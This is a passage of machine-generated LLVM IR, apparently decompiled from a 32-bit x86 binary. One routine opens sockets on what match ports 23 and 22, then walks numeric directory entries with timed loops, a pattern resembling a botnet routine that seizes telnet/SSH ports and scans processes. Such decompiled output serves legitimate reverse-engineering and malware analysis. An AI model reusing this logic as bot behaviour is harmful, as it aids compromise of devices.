  store i32 %v1_804db08, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804d783.outer

dec_label_pc_804db10:                             ; preds = %dec_label_pc_804d793, %dec_label_pc_804d78b
  %v1_804db10 = and i32 %v0_804db10, -256
  %v2_804db10 = or i32 %v1_804db10, 1
  br label %dec_label_pc_804d7a5

dec_label_pc_804db17:                             ; preds = %dec_label_pc_804d6fb, %dec_label_pc_804d6ec
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d711

dec_label_pc_804db27:                             ; preds = %dec_label_pc_804d80b
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db2e = call i32 @function_8051270(i8 6)
  store i32 %v3_804db2e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db3a = call i32 @function_8051270(i8 7)
  store i32 %v3_804db3a, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db46 = call i32 @function_8051270(i8 9)
  store i32 %v3_804db46, i32* %eax.global-to-local, align 4
  %v2_804db56.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804db4e

dec_label_pc_804db4e:                             ; preds = %dec_label_pc_804d694, %dec_label_pc_804db27
  %v2_804db56 = phi i32 [ %v0_804d5e3, %dec_label_pc_804d694 ], [ %v2_804db56.pre, %dec_label_pc_804db27 ]
  %v0_804db54 = load i32, i32* @ebx, align 4
  store i32 %v0_804db54, i32* %eax.global-to-local, align 4
  store i32 %v2_804db56, i32* @ebx, align 4
  store i32 %v0_804d5e2, i32* @esi, align 4
  store i32 %v0_804d5e1, i32* @edi, align 4
  store i32 %v0_804d5e0, i32* @ebp, align 4
  ret i32 %v0_804db54

dec_label_pc_804db62:                             ; preds = %dec_label_pc_804d871, %dec_label_pc_804d859
  %v2_804db65 = inttoptr i32 %v1_804d866 to i32*
  %v3_804db65 = load i32, i32* %v2_804db65, align 4
  store i32 %v3_804db65, i32* %edx.global-to-local, align 4
  %v3_804db69 = inttoptr i32 %v0_804d866 to i32*
  store i32 %v3_804db65, i32* %v3_804db69, align 4
  %v0_804db6a = call i32 @function_8052534()
  store i32 %v0_804db6a, i32* %eax.global-to-local, align 4
  %v0_804db6f = load i32, i32* @esp, align 4
  %v1_804db6f = add i32 %v0_804db6f, 20
  %v2_804db6f = inttoptr i32 %v1_804db6f to i8*
  %v3_804db6f = load i8, i8* %v2_804db6f, align 1
  %v4_804db6f = sext i8 %v3_804db6f to i32
  store i32 %v4_804db6f, i32* @ebx, align 4
  %v1_804db74 = add i32 %v0_804db6f, 16
  br label %dec_label_pc_804db77

dec_label_pc_804db77:                             ; preds = %dec_label_pc_804d82d, %dec_label_pc_804db62
  %v0_804db77 = phi i32 [ %v15_804d5e4, %dec_label_pc_804d82d ], [ %v1_804db74, %dec_label_pc_804db62 ]
  %v1_804db7a = add i32 %v0_804db77, -16
  %v2_804db7a = inttoptr i32 %v1_804db7a to i32*
  store i32 1, i32* %v2_804db7a, align 4
  %v1_804db7c = sext i8 %stack_var_-8769.2 to i32
  %v2_804db7c = call i32 @function_8053d90(i32 %v1_804db7c)
  store i32 %v2_804db7c, i32* %eax.global-to-local, align 4
  %v0_804db81 = load i32, i32* @esp, align 4
  %v1_804db81 = inttoptr i32 %v0_804db81 to i32*
  store i32 6, i32* %v1_804db81, align 4
  %v3_804db88 = call i32 @function_8051270(i8 %stack_var_-8769.2)
  store i32 %v3_804db88, i32* %eax.global-to-local, align 4
  %v0_804db8d = load i32, i32* @esp, align 4
  %v1_804db8d = inttoptr i32 %v0_804db8d to i32*
  store i32 7, i32* %v1_804db8d, align 4
  %v3_804db94 = call i32 @function_8051270(i8 %stack_var_-8769.2)
  store i32 %v3_804db94, i32* %eax.global-to-local, align 4
  %v0_804db99 = load i32, i32* @esp, align 4
  %v1_804db99 = inttoptr i32 %v0_804db99 to i32*
  store i32 9, i32* %v1_804db99, align 4
  %v3_804dba0 = call i32 @function_8051270(i8 %stack_var_-8769.2)
  %v0_804dba5 = load i32, i32* @esp, align 4
  %v0_804dba8 = load i32, i32* @ebx, align 4
  store i32 %v0_804dba8, i32* %eax.global-to-local, align 4
  %v1_804dbaa = add i32 %v0_804dba5, 8780
  %v1_804dbb0 = inttoptr i32 %v1_804dbaa to i32*
  %v2_804dbb0 = load i32, i32* %v1_804dbb0, align 4
  store i32 %v2_804dbb0, i32* @ebx, align 4
  %v3_804dbb0 = add i32 %v0_804dba5, 8784
  %v1_804dbb1 = inttoptr i32 %v3_804dbb0 to i32*
  %v2_804dbb1 = load i32, i32* %v1_804dbb1, align 4
  store i32 %v2_804dbb1, i32* @esi, align 4
  %v3_804dbb1 = add i32 %v0_804dba5, 8788
  %v1_804dbb2 = inttoptr i32 %v3_804dbb1 to i32*
  %v2_804dbb2 = load i32, i32* %v1_804dbb2, align 4
  store i32 %v2_804dbb2, i32* @edi, align 4
  %v3_804dbb2 = add i32 %v0_804dba5, 8792
  %v1_804dbb3 = inttoptr i32 %v3_804dbb2 to i32*
  %v2_804dbb3 = load i32, i32* %v1_804dbb3, align 4
  store i32 %v2_804dbb3, i32* @ebp, align 4
  ret i32 %v0_804dba8

dec_label_pc_804dbb5:                             ; preds = %dec_label_pc_804d5e0
  %v3_804dbb5 = load i8, i8* %stack_var_-48, align 1
  %v4_804dbb5 = sext i8 %v3_804dbb5 to i32
  %v4_804dbcb = zext i8 %tmp47 to i32
  %v6_804dbcb = and i32 %v4_804dbb5, -256
  %v7_804dbcb = or i32 %v6_804dbcb, %v4_804dbcb
  store i32 %v7_804dbcb, i32* %eax.global-to-local, align 4
  store i8 48, i8* %stack_var_-48, align 1
  br label %dec_label_pc_804d694

dec_label_pc_804dbee:                             ; preds = %dec_label_pc_804d99d.backedge, %dec_label_pc_804d9b3, %dec_label_pc_804d99d.preheader
  %v0_804d9a6.lcssa = phi i32 [ %v0_804d9a685, %dec_label_pc_804d99d.preheader ], [ %v0_804d9a688, %dec_label_pc_804d9b3 ], [ %v0_804d9a6, %dec_label_pc_804d99d.backedge ]
  %v0_804dbf1 = load i32, i32* @ebp, align 4
  %v3_804dbf1 = inttoptr i32 %v0_804d9a6.lcssa to i32*
  store i32 %v0_804dbf1, i32* %v3_804dbf1, align 4
  %v0_804dbf2 = call i32 @function_8052534()
  store i32 %v0_804dbf2, i32* %eax.global-to-local, align 4
  %v0_804dbf7 = load i32, i32* @esp, align 4
  %v1_804dbf7 = add i32 %v0_804dbf7, 16
  br label %dec_label_pc_804d859

; uselistorder directives
  uselistorder i32 %v1_804db08, { 1, 0 }
  uselistorder i32 %v1_804daf8, { 2, 0, 1 }
  uselistorder i32 %v0_804d9a1, { 1, 0, 2 }
  uselistorder i32 %v0_804daca, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804da9d, { 0, 2, 1 }
  uselistorder i32 %v0_804d9a688, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v1_804d98b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804d90e, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804d883, { 0, 2, 1 }
  uselistorder i32 %v1_804d866, { 1, 0 }
  uselistorder i32 %v0_804d866, { 0, 5, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_804d861, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804d859, { 1, 0 }
  uselistorder i32 %v4_804d833, { 1, 0, 2 }
  uselistorder i8 %stack_var_-8769.2, { 0, 2, 1, 3 }
  uselistorder i8* %.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804d7ef, { 1, 0 }
  uselistorder i32 %v3_804d7e7, { 1, 3, 2, 4, 0 }
  uselistorder i8 %v3_804d7ca, { 0, 2, 1 }
  uselistorder i32 %v1_804d7ca, { 0, 2, 1 }
  uselistorder i32 %v1_804d7a5, { 1, 0 }
  uselistorder i32 %storemerge4, { 0, 2, 1 }
  uselistorder i32 %v1_804d786, { 2, 3, 4, 0, 1, 5, 6, 7 }
  uselistorder i32 %v7_804d783, { 0, 3, 1, 2 }
  uselistorder i32 %v0_804db10, { 1, 0, 2 }
  uselistorder i32 %v0_804daf8, { 3, 2, 0, 1 }
  uselistorder i8 %stack_var_-8769.1.ph, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804d735, { 0, 2, 1 }
  uselistorder i32 %v7_804d732, { 1, 0 }
  uselistorder i32 %v0_804d72f, { 1, 0 }
  uselistorder i32 %v4_804d6dc, { 1, 2, 0 }
  uselistorder i32 %v7_804d718, { 1, 0, 2 }
  uselistorder i32 %v1_804d72f, { 2, 0, 1, 3 }
  uselistorder i32 %v8_804d706, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804d705, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804d744, { 1, 0, 2 }
  uselistorder i32 %v2_804d66a, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v2_804d5ea, { 1, 2, 0, 3 }
  uselistorder i32 %v15_804d5e4, { 3, 0, 1, 2 }
  uselistorder i8* %stack_var_-561, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i8** %stack_var_-8796, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 1, 14, 13, 12, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8* %stack_var_-48, { 4, 3, 0, 1, 2 }
  uselistorder i32* %stack_var_-32, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 91, 77, 78, 79, 80, 81, 82, 92, 83, 84, 85, 86, 87, 88, 89, 90 }
  uselistorder i32 (i8*, i32)* @function_8051d40, { 1, 0, 2, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8054acd.6 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8051e60, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804db77, { 1, 0 }
  uselistorder label %dec_label_pc_804db4e, { 1, 0 }
  uselistorder label %dec_label_pc_804d99d.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d9b3, { 1, 0 }
  uselistorder label %dec_label_pc_804d859, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_804d80b.loopexit, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d6ec.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804d6d4.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804d783, { 1, 0 }
  uselistorder label %dec_label_pc_804d744, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d6d4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d711, { 1, 0 }
  uselistorder label %dec_label_pc_804d705, { 1, 0 }
  uselistorder label %dec_label_pc_804d694, { 1, 0 }
}

define i32 @function_804dc00() local_unnamed_addr {
dec_label_pc_804dc00:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-8388 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-8444 = alloca i32, align 4
  %stack_var_-8460 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8460, align 4
  %v2_804dc0c = call i32 @function_80524a2(i32* null)
  store i32 %v2_804dc0c, i32* %eax.global-to-local, align 4
  store i32 %v2_804dc0c, i32* @edi, align 4
  %v0_804dc13 = call i32 @function_805220f()
  store i32 %v0_804dc13, i32* %eax.global-to-local, align 4
  %v12_804dc18 = ptrtoint i32* %stack_var_-8444 to i32
  store i32 %v0_804dc13, i32* @global_var_8056944.21, align 4
  %tmp113 = icmp slt i32 %v0_804dc13, 1
  br i1 %tmp113, label %dec_label_pc_804dc2f, label %dec_label_pc_804dc24

dec_label_pc_804dc24:                             ; preds = %dec_label_pc_804de10, %dec_label_pc_804dce1, %dec_label_pc_804dc2f, %dec_label_pc_804dc00
  %v0_804dc2e = phi i32 [ -1, %dec_label_pc_804dce1 ], [ 0, %dec_label_pc_804dc2f ], [ %v0_804dc13, %dec_label_pc_804dc00 ], [ 0, %dec_label_pc_804de10 ]
  ret i32 %v0_804dc2e

dec_label_pc_804dc2f:                             ; preds = %dec_label_pc_804dc00
  %v1_804dc2f = add i32 %v0_804dc13, 1
  %v8_804dc2f = icmp eq i32 %v1_804dc2f, 0
  store i32 %v1_804dc2f, i32* %eax.global-to-local, align 4
  br i1 %v8_804dc2f, label %dec_label_pc_804dc24, label %dec_label_pc_804dc32

dec_label_pc_804dc32:                             ; preds = %dec_label_pc_804dc2f
  store i32 2, i32* %stack_var_-52, align 4
  store i32 5888, i32* %stack_var_-8460, align 4
  %v1_804dc4f = call i32 @function_804d5e0(i32 5888)
  store i32 %v1_804dc4f, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804dc67 = call i32 @function_80529d5(i32 2, i32 1, i32 0)
  store i32 %v3_804dc67, i32* %eax.global-to-local, align 4
  store i32 %v3_804dc67, i32* @ebx, align 4
  %v10_804dc71 = icmp eq i32 %v3_804dc67, -1
  br i1 %v10_804dc71, label %dec_label_pc_804dc94, label %dec_label_pc_804dc76

dec_label_pc_804dc76:                             ; preds = %dec_label_pc_804dc32
  %v2_804dc76 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804dc76, i32* %eax.global-to-local, align 4
  %v0_804dc7d = load i32, i32* @edx, align 4
  store i32 %v3_804dc67, i32* %stack_var_-8460, align 4
  %v4_804dc82 = call i32 @function_80527cf(i32 %v3_804dc67, i32 %v2_804dc76, i32 16, i32 %v0_804dc7d)
  store i32 %v4_804dc82, i32* %eax.global-to-local, align 4
  %v2_804dc87 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dc87, i32* @esi, align 4
  store i32 %v2_804dc76, i32* @ebp, align 4
  %v0_804dc8b = load i32, i32* @ebx, align 4
  store i32 %v0_804dc8b, i32* %stack_var_-8460, align 4
  %v2_804dc8c = call i32 @function_805288b(i32 %v0_804dc8b, i32 1)
  store i32 %v2_804dc8c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dc94

dec_label_pc_804dc94:                             ; preds = %dec_label_pc_804dc32, %dec_label_pc_804dc76
  store i32 5632, i32* %stack_var_-8460, align 4
  %v1_804dc9c = call i32 @function_804d5e0(i32 5632)
  store i32 %v1_804dc9c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804dcb4 = call i32 @function_80529d5(i32 2, i32 1, i32 0)
  store i32 %v3_804dcb4, i32* %eax.global-to-local, align 4
  store i32 %v3_804dcb4, i32* @ebx, align 4
  %v10_804dcbe = icmp eq i32 %v3_804dcb4, -1
  br i1 %v10_804dcbe, label %dec_label_pc_804dce1, label %dec_label_pc_804dcc3

dec_label_pc_804dcc3:                             ; preds = %dec_label_pc_804dc94
  %v2_804dcc3 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804dcc3, i32* %eax.global-to-local, align 4
  %v0_804dcca = load i32, i32* @ecx, align 4
  store i32 %v3_804dcb4, i32* %stack_var_-8460, align 4
  %v4_804dccf = call i32 @function_80527cf(i32 %v3_804dcb4, i32 %v2_804dcc3, i32 16, i32 %v0_804dcca)
  %v2_804dcd4 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dcd4, i32* %eax.global-to-local, align 4
  %v0_804dcd8 = load i32, i32* @ebx, align 4
  store i32 %v0_804dcd8, i32* %stack_var_-8460, align 4
  %v2_804dcd9 = call i32 @function_805288b(i32 %v0_804dcd8, i32 1)
  store i32 %v2_804dcd9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dce1

dec_label_pc_804dce1:                             ; preds = %dec_label_pc_804dc94, %dec_label_pc_804dcc3
  store i32 5, i32* %stack_var_-8460, align 4
  %v1_804dce6 = call i32 @function_8053d90(i32 5)
  store i32 %v1_804dce6, i32* %eax.global-to-local, align 4
  store i32 4096, i32* %stack_var_-8460, align 4
  %v1_804dcf2 = call i32 @function_8052b74(i32 4096)
  %v2_804dcf2 = inttoptr i32 %v1_804dcf2 to i8*
  store i32 %v1_804dcf2, i32* %eax.global-to-local, align 4
  store i32 %v1_804dcf2, i32* @global_var_8056940.22, align 64
  store i8 0, i8* %v2_804dcf2, align 1
  store i32 6, i32* %stack_var_-8460, align 4
  store i32 0, i32* @global_var_80568c0.23, align 64
  %v2_804dd10 = call i32 @function_80512f0(i8 6)
  store i32 %v2_804dd10, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804dd1c = call i32 @function_80512f0(i8 7)
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v3_804dd27 = call i32 @function_8051240(i32 6, i32* null)
  %v2_804dd2c = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dd2c, i32* @ebx, align 4
  %v2_804dd2f = ptrtoint i32* %stack_var_-8388 to i32
  store i32 %v2_804dd2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v2_804dd38 = bitcast i32* %stack_var_-8388 to i8*
  %v3_804dd38 = call i32 @function_8051c60(i8* %v2_804dd38, i32 %v3_804dd27)
  store i32 %v3_804dd38, i32* %eax.global-to-local, align 4
  %v2_804dd41 = add i32 %v3_804dd38, %v2_804dd2f
  store i32 %v2_804dd41, i32* @ebx, align 4
  %v0_804dd43 = call i32 @function_8052235()
  store i32 %v0_804dd43, i32* %eax.global-to-local, align 4
  %v2_804dd4b = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v0_804dd43, i32* %stack_var_-8460, align 4
  %v3_804dd56 = sext i32 %v0_804dd43 to i64
  %v4_804dd56 = call i32 @function_8052050(i64 %v3_804dd56, i32 10, i32 %v2_804dd4b)
  store i32 %v4_804dd56, i32* %eax.global-to-local, align 4
  %v0_804dd5e = load i32, i32* @ebx, align 4
  store i32 %v0_804dd5e, i32* %stack_var_-8460, align 4
  %v2_804dd5f = inttoptr i32 %v0_804dd5e to i8*
  %v3_804dd5f = call i32 @function_8051c60(i8* %v2_804dd5f, i32 %v4_804dd56)
  %v2_804dd64 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dd64, i32* @ebp, align 4
  %v0_804dd65 = load i32, i32* @ebx, align 4
  %v2_804dd65 = add i32 %v0_804dd65, %v3_804dd5f
  store i32 %v2_804dd65, i32* @ebx, align 4
  store i32 %v4_804dd56, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v3_804dd6c = call i32 @function_8051240(i32 7, i32* null)
  store i32 %v3_804dd6c, i32* %eax.global-to-local, align 4
  %v0_804dd74 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd74, i32* %stack_var_-8460, align 4
  %v2_804dd75 = inttoptr i32 %v0_804dd74 to i8*
  %v3_804dd75 = call i32 @function_8051c60(i8* %v2_804dd75, i32 %v3_804dd6c)
  store i32 %v3_804dd75, i32* @esi, align 4
  store i32 %v2_804dd2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v3_804dd85 = call i32 @function_80522f2(i8* %v2_804dd38, i32 0)
  store i32 %v3_804dd85, i32* %eax.global-to-local, align 4
  %v10_804dd8d = icmp eq i32 %v3_804dd85, -1
  br i1 %v10_804dd8d, label %dec_label_pc_804dc24, label %dec_label_pc_804dd96

dec_label_pc_804dd96:                             ; preds = %dec_label_pc_804dce1
  store i32 %v3_804dd85, i32* %stack_var_-8460, align 4
  %v1_804dd9a = call i32 @function_80521e1(i32 %v3_804dd85)
  store i32 %v1_804dd9a, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v2_804dda6 = call i32 @function_8051270(i8 6)
  store i32 %v2_804dda6, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804ddb2 = call i32 @function_8051270(i8 7)
  %v0_804ddba = load i32, i32* @global_var_8056940.22, align 64
  store i32 %v2_804dd2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v4_804ddca = call i32 @function_80523b2(i8* %v2_804dd38, i32 %v0_804ddba, i32 4095)
  store i32 %v4_804ddca, i32* %eax.global-to-local, align 4
  %v10_804ddd4 = icmp eq i32 %v4_804ddca, -1
  br i1 %v10_804ddd4, label %dec_label_pc_804dde2, label %dec_label_pc_804ddd9

dec_label_pc_804ddd9:                             ; preds = %dec_label_pc_804dd96
  %v0_804ddd9 = load i32, i32* @global_var_8056940.22, align 64
  store i32 %v0_804ddd9, i32* %eax.global-to-local, align 4
  %v2_804ddde = add i32 %v0_804ddd9, %v4_804ddca
  %v3_804ddde = inttoptr i32 %v2_804ddde to i8*
  store i8 0, i8* %v3_804ddde, align 1
  br label %dec_label_pc_804dde2

dec_label_pc_804dde2:                             ; preds = %dec_label_pc_804dd96, %dec_label_pc_804ddd9
  %v0_804dde8 = load i32, i32* @ebx, align 4
  %v1_804dde8 = load i32, i32* @esi, align 4
  %v2_804dde8 = sub i32 %v0_804dde8, %v2_804dd2f
  %v2_804ddeb = add i32 %v2_804dde8, %v1_804dde8
  %v0_804dded = load i32, i32* @edi, align 4
  store i32 %v0_804dded, i32* @ebx, align 4
  store i32 400, i32* @esi, align 4
  store i32 %v2_804dd2f, i32* @eax, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v2_804ddfa = call i32 @function_8051cd0(i32 %v2_804dd2f, i32 %v2_804ddeb)
  store i32 %v2_804ddfa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804de10

dec_label_pc_804de10:                             ; preds = %dec_label_pc_804e043, %dec_label_pc_804dde2
  %storemerge8 = phi i32 [ %v1_804e050, %dec_label_pc_804e043 ], [ %v12_804dc18, %dec_label_pc_804dde2 ]
  %v1_804de13 = add i32 %storemerge8, -16
  %v2_804de13 = inttoptr i32 %v1_804de13 to i32*
  store i32 6, i32* %v2_804de13, align 4
  %v2_804de15 = call i32 @function_80512f0(i8 0)
  store i32 %v2_804de15, i32* %eax.global-to-local, align 4
  %v0_804de1a = load i32, i32* @esp, align 4
  %v1_804de1a = inttoptr i32 %v0_804de1a to i32*
  %v2_804de1a = load i32, i32* %v1_804de1a, align 4
  store i32 %v2_804de1a, i32* %eax.global-to-local, align 4
  %v3_804de1a = add i32 %v0_804de1a, 4
  %v1_804de1b = inttoptr i32 %v3_804de1a to i32*
  store i32 0, i32* %v1_804de1b, align 4
  store i32 6, i32* %v1_804de1a, align 4
  %v3_804de20 = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804de20, i32* %eax.global-to-local, align 4
  %v1_804de25 = load i32, i32* @esp, align 4
  %v2_804de25 = inttoptr i32 %v1_804de25 to i32*
  store i32 %v3_804de20, i32* %v2_804de25, align 4
  %v1_804de28 = call i32 @function_80525a4(i32 0)
  store i32 %v1_804de28, i32* %eax.global-to-local, align 4
  %v1_804de2d = load i32, i32* @esp, align 4
  %v2_804de2d = add i32 %v1_804de2d, 32
  %v3_804de2d = inttoptr i32 %v2_804de2d to i32*
  store i32 %v1_804de28, i32* %v3_804de2d, align 4
  %v0_804de34 = load i32, i32* %eax.global-to-local, align 4
  %v1_804de34 = icmp eq i32 %v0_804de34, 0
  br i1 %v1_804de34, label %dec_label_pc_804dc24, label %dec_label_pc_804de3c

dec_label_pc_804de3c:                             ; preds = %dec_label_pc_804de10
  %v0_804de31 = load i32, i32* @esp, align 4
  %v2_804de3f = inttoptr i32 %v0_804de31 to i32*
  store i32 6, i32* %v2_804de3f, align 4
  %v2_804de41 = call i32 @function_8051270(i8 0)
  store i32 %v2_804de41, i32* %eax.global-to-local, align 4
  %v0_804de46 = load i32, i32* @esp, align 4
  %v1_804de46 = add i32 %v0_804de46, 16
  br label %dec_label_pc_804de50

dec_label_pc_804de50:                             ; preds = %dec_label_pc_804e058, %dec_label_pc_804e064, %dec_label_pc_804de6a, %dec_label_pc_804e081, %dec_label_pc_804e038, %dec_label_pc_804deac, %dec_label_pc_804e31c, %dec_label_pc_804de3c
  %v0_804de50 = phi i32 [ %v1_804de46, %dec_label_pc_804de3c ], [ %v1_804e350, %dec_label_pc_804e31c ], [ %v1_804de9e, %dec_label_pc_804deac ], [ %v0_804e03a, %dec_label_pc_804e038 ], [ %v1_804e08b, %dec_label_pc_804e081 ], [ %v1_804de5d, %dec_label_pc_804de6a ], [ %v1_804de9e, %dec_label_pc_804e064 ], [ %v1_804de9e, %dec_label_pc_804e058 ]
  %v1_804de53 = add i32 %v0_804de50, 16
  %v2_804de53 = inttoptr i32 %v1_804de53 to i32*
  %v3_804de53 = load i32, i32* %v2_804de53, align 4
  store i32 %v3_804de53, i32* %eax.global-to-local, align 4
  %v2_804de57 = add i32 %v0_804de50, -16
  %v3_804de57 = inttoptr i32 %v2_804de57 to i32*
  store i32 %v3_804de53, i32* %v3_804de57, align 4
  %v0_804de58 = call i32 @function_8052695()
  store i32 %v0_804de58, i32* %eax.global-to-local, align 4
  %v0_804de5d = load i32, i32* @esp, align 4
  store i32 %v0_804de58, i32* @edx, align 4
  %v1_804de62 = icmp eq i32 %v0_804de58, 0
  br i1 %v1_804de62, label %dec_label_pc_804e043, label %dec_label_pc_804de6a

dec_label_pc_804de6a:                             ; preds = %dec_label_pc_804de50
  %v1_804de5d = add i32 %v0_804de5d, 16
  %v1_804de6a = add i32 %v0_804de58, 11
  %v2_804de6a = inttoptr i32 %v1_804de6a to i8*
  %v3_804de6a = load i8, i8* %v2_804de6a, align 1
  %v4_804de6a = zext i8 %v3_804de6a to i32
  %v6_804de6a = and i32 %v0_804de58, -256
  %v7_804de6a = or i32 %v4_804de6a, %v6_804de6a
  %v1_804de6d = add i32 %v7_804de6a, -48
  %v8_804de6d = trunc i32 %v1_804de6d to i8
  store i32 %v1_804de6d, i32* %eax.global-to-local, align 4
  %v8_804de72 = icmp ugt i8 %v8_804de6d, 9
  br i1 %v8_804de72, label %dec_label_pc_804de50, label %dec_label_pc_804de74

dec_label_pc_804de74:                             ; preds = %dec_label_pc_804de6a
  store i32 %v1_804de6a, i32* @edi, align 4
  %v3_804de7a = inttoptr i32 %v0_804de5d to i32*
  store i32 %v1_804de6a, i32* %v3_804de7a, align 4
  %v0_804de7b = call i32 @function_8053be6()
  store i32 %v0_804de7b, i32* %eax.global-to-local, align 4
  %v0_804de80 = load i32, i32* @esp, align 4
  store i32 %v0_804de7b, i32* @ebp, align 4
  %v1_804de85 = add i32 %v0_804de80, 28
  %v2_804de85 = inttoptr i32 %v1_804de85 to i32*
  %v3_804de85 = load i32, i32* %v2_804de85, align 4
  %v1_804de89 = add i32 %v3_804de85, 1
  store i32 %v1_804de89, i32* %eax.global-to-local, align 4
  %v0_804de8a = load i32, i32* @esi, align 4
  store i32 %v1_804de89, i32* %v2_804de85, align 4
  %v5_804de90 = icmp slt i32 %v0_804de8a, %v0_804de7b
  %v0_804deb3 = load i32, i32* @esp, align 4
  %v1_804deb6 = add i32 %v0_804deb3, -16
  %v2_804deb6 = inttoptr i32 %v1_804deb6 to i32*
  store i32 0, i32* %v2_804deb6, align 4
  %v2_804deb8 = call i32 @function_80524a2(i32* null)
  store i32 %v2_804deb8, i32* %eax.global-to-local, align 4
  br i1 %v5_804de90, label %dec_label_pc_804deb3, label %dec_label_pc_804de92

dec_label_pc_804de92:                             ; preds = %dec_label_pc_804de74
  %v1_804de9c = load i32, i32* @ebx, align 4
  %v2_804de9c = sub i32 %v2_804deb8, %v1_804de9c
  store i32 %v2_804de9c, i32* %eax.global-to-local, align 4
  %v0_804de9e = load i32, i32* @esp, align 4
  %v1_804de9e = add i32 %v0_804de9e, 16
  %v1_804dea1 = add i32 %v2_804de9c, -600
  %v6_804dea1 = sub i32 599, %v2_804de9c
  %v7_804dea1 = and i32 %v6_804dea1, %v2_804de9c
  %v8_804dea1 = icmp slt i32 %v7_804dea1, 0
  %v9_804dea1 = icmp eq i32 %v1_804dea1, 0
  %v10_804dea1 = icmp slt i32 %v1_804dea1, 0
  %v3_804dea6 = icmp ne i1 %v10_804dea1, %v8_804dea1
  %v4_804dea6 = or i1 %v9_804dea1, %v3_804dea6
  br i1 %v4_804dea6, label %dec_label_pc_804e058, label %dec_label_pc_804deac

dec_label_pc_804deac:                             ; preds = %dec_label_pc_804de92
  store i32 400, i32* @esi, align 4
  br label %dec_label_pc_804de50

dec_label_pc_804deb3:                             ; preds = %dec_label_pc_804de74
  store i32 %v2_804deb8, i32* %eax.global-to-local, align 4
  %v0_804debd = load i32, i32* @esp, align 4
  %v1_804debd = inttoptr i32 %v0_804debd to i32*
  store i32 6, i32* %v1_804debd, align 4
  %v1_804dec4 = load i32, i32* @esp, align 4
  %v2_804dec4 = add i32 %v1_804dec4, 24
  %v3_804dec4 = inttoptr i32 %v2_804dec4 to i32*
  store i32 %v2_804deb8, i32* %v3_804dec4, align 4
